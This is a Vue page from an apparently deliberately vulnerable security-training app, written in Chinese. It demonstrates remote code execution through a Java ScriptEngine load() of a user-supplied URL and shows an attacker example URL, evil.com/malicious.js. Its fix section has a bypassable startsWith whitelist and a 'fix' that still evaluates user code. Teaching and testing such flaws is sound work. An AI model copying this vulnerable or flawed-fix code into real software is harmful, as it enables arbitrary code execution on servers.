<template>
  <vuln-template
    title="模板渲染服务"
    subtitle="Template Rendering Service"
    level="严重"
    :icon="ThunderboltOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        本系统提供了<strong>模板渲染服务</strong>，支持从远程URL加载JavaScript模板文件并渲染。
      </a-typography-paragraph>
      <a-typography-paragraph>
        功能特点：
      </a-typography-paragraph>
      <ul>
        <li>支持从CDN加载模板文件</li>
        <li>支持动态模板渲染</li>
        <li>支持自定义模板变量</li>
        <li>实时渲染并返回结果</li>
      </ul>
    </template>

    <template #payload>
      <a-typography-paragraph>
        示例模板URL：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        https://cdn.example.com/template.js
      </a-typography-paragraph>
    </template>

    <template #test-form>
      <div class="code-exec-container">
        <a-card title="模板渲染服务" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            请输入模板文件的URL地址，系统将加载并渲染模板。
          </a-typography-paragraph>
          <a-typography-paragraph style="color: #999; font-size: 12px; margin-top: 8px;">
            提示：支持http/https协议的URL，模板文件应为JavaScript格式
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="模板URL"
            name="code"
            :rules="[{ required: true, message: '请输入模板URL' }]"
          >
            <a-input
              v-model:value="formState.code"
              size="large"
              placeholder="例如：https://cdn.example.com/template.js"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><code-outlined /></template>
                加载并渲染
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端实现代码：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/api/template")
public class TemplateService {
    @PostMapping("/render")
    public String renderTemplate(String templateUrl) {
        try {
            // 使用JavaScript引擎加载并执行远程模板文件
            ScriptEngine engine = new ScriptEngineManager()
                .getEngineByExtension("js");
            
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            // 加载远程模板文件
            String loadCommand = String.format("load('%s')", templateUrl);
            engine.eval(loadCommand, bindings);
            return "模板渲染成功: " + templateUrl;
        } catch (Exception e) {
            return "渲染失败: " + e.getMessage();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="安全提示：从远程URL加载模板文件存在安全风险，应该对URL进行白名单验证，并限制可访问的域名"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁止load()函数：</strong>不要使用JavaScript引擎的load()函数加载远程脚本</li>
        <li><strong>URL白名单：</strong>如果必须加载脚本，使用URL白名单，只允许可信域名</li>
        <li><strong>禁用危险函数：</strong>配置JavaScript引擎，禁用load、eval等危险函数</li>
        <li><strong>输入验证：</strong>验证URL格式，只允许http/https协议</li>
        <li><strong>沙箱隔离：</strong>使用安全管理器限制脚本执行权限</li>
        <li><strong>替换方案：</strong>使用安全的模板引擎而不是代码执行</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
        String payload = String.format("load('%s')", url);
        engine.eval(payload);
// 攻击者可以输入: http://evil.com/malicious.js</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：禁止load()函数（最佳方案）
        // 不要提供远程脚本加载功能
// 如果需要脚本功能，使用预定义的脚本模板</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：URL白名单验证
        private static final String[] ALLOWED_DOMAINS = {
            "https://cdn.example.com",
            "https://static.example.com"
        };
        
        @GetMapping("/loadjs")
        public String loadJsExec(String url) {
            // 验证URL格式
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                throw new SecurityException("只允许http/https协议");
            }
            
            // 验证域名是否在白名单中
            boolean isAllowed = false;
            for (String domain : ALLOWED_DOMAINS) {
                if (url.startsWith(domain)) {
                    isAllowed = true;
                    break;
                }
            }
            
            if (!isAllowed) {
                throw new SecurityException("域名不在白名单中");
            }
            
            // 验证URL格式
            try {
                new URL(url);
            } catch (MalformedURLException e) {
                throw new SecurityException("无效的URL格式");
            }
            
            // 使用白名单URL加载脚本
            ScriptEngine engine = new ScriptEngineManager()
                .getEngineByExtension("js");
            String payload = String.format("load('%s')", url);
            engine.eval(payload);
            return "脚本加载成功";
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：禁用load函数
        @GetMapping("/loadjs")
        public String loadJsExec(String code) {
            ScriptEngine engine = new ScriptEngineManager()
                .getEngineByExtension("js");
            
            // 创建自定义的Bindings，移除load函数
            Bindings bindings = engine.createBindings();
            bindings.remove("load");
            bindings.remove("eval");
            
            // 只允许执行预定义的代码，不允许load远程脚本
            Object result = engine.eval(code, bindings);
            return result.toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：使用安全管理器
        SecurityManager securityManager = new SecurityManager() {
            @Override
            public void checkConnect(String host, int port) {
                // 禁止网络连接
                throw new SecurityException("不允许网络连接");
            }
        };
        System.setSecurityManager(securityManager);
// 这样load()函数无法加载远程脚本</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { ThunderboltOutlined, CodeOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/api/template")
public class TemplateService {
    @PostMapping("/render")
    public String renderTemplate(String templateUrl) {
        try {
            // 使用JavaScript引擎加载并执行远程模板文件
            ScriptEngine engine = new ScriptEngineManager()
                .getEngineByExtension("js");
            
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            // 加载远程模板文件
            String loadCommand = String.format("load('%s')", templateUrl);
            engine.eval(loadCommand, bindings);
            return "模板渲染成功: " + templateUrl;
        } catch (Exception e) {
            return "渲染失败: " + e.getMessage();
        }
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
String payload = String.format("load('%s')", url);
engine.eval(payload);
// 攻击者可以输入: http://evil.com/malicious.js`

const fixCode2 = `// 正确示例1：禁止load()函数（最佳方案）
// 不要提供远程脚本加载功能
// 如果需要脚本功能，使用预定义的脚本模板`

const fixCode3 = `// 正确示例2：URL白名单验证
private static final String[] ALLOWED_DOMAINS = {
    "https://cdn.example.com",
    "https://static.example.com"
};

@GetMapping("/loadjs")
public String loadJsExec(String url) {
    // 验证URL格式
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        throw new SecurityException("只允许http/https协议");
    }
    
    // 验证域名是否在白名单中
    boolean isAllowed = false;
    for (String domain : ALLOWED_DOMAINS) {
        if (url.startsWith(domain)) {
            isAllowed = true;
            break;
        }
    }
    
    if (!isAllowed) {
        throw new SecurityException("域名不在白名单中");
    }
    
    // 验证URL格式
    try {
        new URL(url);
    } catch (MalformedURLException e) {
        throw new SecurityException("无效的URL格式");
    }
    
    // 使用白名单URL加载脚本
    ScriptEngine engine = new ScriptEngineManager()
        .getEngineByExtension("js");
    String payload = String.format("load('%s')", url);
    engine.eval(payload);
    return "脚本加载成功";
}`

const fixCode4 = `// 正确示例3：禁用load函数
@GetMapping("/loadjs")
public String loadJsExec(String code) {
    ScriptEngine engine = new ScriptEngineManager()
        .getEngineByExtension("js");
    
    // 创建自定义的Bindings，移除load函数
    Bindings bindings = engine.createBindings();
    bindings.remove("load");
    bindings.remove("eval");
    
    // 只允许执行预定义的代码，不允许load远程脚本
    Object result = engine.eval(code, bindings);
    return result.toString();
}`

const fixCode5 = `// 正确示例4：使用安全管理器
SecurityManager securityManager = new SecurityManager() {
    @Override
    public void checkConnect(String host, int port) {
        // 禁止网络连接
        throw new SecurityException("不允许网络连接");
    }
};
System.setSecurityManager(securityManager);
// 这样load()函数无法加载远程脚本`

const formState = reactive({
  code: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/rce/loadjs', {
      params: { url: formState.code }
    })
    result.value = response.data
    message.success('模板加载成功')
  } catch (error) {
    message.error('模板加载失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.code = ''
  result.value = ''
}
</script>
